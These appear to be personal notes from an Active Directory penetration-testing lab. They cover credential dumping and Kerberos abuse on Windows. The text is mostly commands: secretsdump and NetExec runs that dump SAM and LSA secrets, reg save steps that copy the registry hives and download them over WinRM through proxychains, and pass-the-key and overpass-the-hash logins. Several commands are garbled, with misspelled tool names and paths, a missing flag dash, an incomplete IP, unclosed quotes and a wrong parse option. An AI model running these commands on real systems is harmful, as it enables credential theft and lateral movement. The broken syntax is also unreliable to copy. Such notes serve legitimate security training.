## Token Impersonation
dump registry hive
- remember to try `--local-auth`
`impacket-secretsdump <user>:<pass>@<IP>`
`nxc smb <IP> -u <user> -p <pass> --sam --lsa`
- use `--sam` and `--lsa` is efficient and does both at once
![](assets/Pasted%20image%2020260710083953.png)


## Kerberos Authentication
after dumping hashes and keys, we have all we need to Pass the Key

**Pass the Key**
![](assets/Pasted%20image%2020260710090826.png)
- can skip the first step when you have the Kerberos key

NetExec supports AES auth by default
`nxc smb <IP> -u <user> --aesKey <aes-key>`
![](assets/Pasted%20image%2020260710090957.png)


**Overpass the Hash**
same idea, but instead of AES we use RC4
`nxc smb <IP> -u <user> -H <hash> --kerberos`
- same as pass the hash, but adding `--kerberos` to force Kerberos auth


**Win-RM**
`reg save HKLM\SAM C:\Windows\Temp\SAM`
`nxc winrm <IP> -u <user> p <pass> --get-file '\Windows\Temp\SAM' 'SAM'`
- do the same with SECURITY and SYSTEM

once you have them all, parse it locally
`impacket-securetsdump LOCAL -sam SAM -security SECURITY -system SYSTEM`

if you find a backup of a Windows machine, copy the hives from
`C:\Windows\System32\config\`


**Learning Objective 10**
Extract hives from machine
- copy hives
`proxychains -q nxc winrm 172.162.17 -u <user> -p <pass> -x 'reg save HKLM\SAM C:\WIndwows\Temp\SAM1`
`proxychains -q nxc winrm 172.162.17 -u <user> -p <pass> -x 'reg save HKLM\SECURIY C:\WIndwows\Temp\SECURITY1`
`proxychains -q nxc winrm 172.162.17 -u <user> -p <pass> -x 'reg save HKLM\SYSTEM C:\WIndwows\Temp\SSYSTEM1`

- download files
`proxychains -q nxc winrm 172.162.17 -u <user> -p <pass> --get-file '\Windows\Temp\SAM1`
`proxychains -q nxc winrm 172.162.17 -u <user> -p <pass> --get-file '\Windows\Temp\SYSTEM1`
`proxychains -q nxc winrm 172.162.17 -u <user> -p <pass> --get-file '\Windows\Temp\SECURIY1`

- parse locally
`impacket-secretsdump LOCAL -sam SAM -security SECURITY -sam SAM`

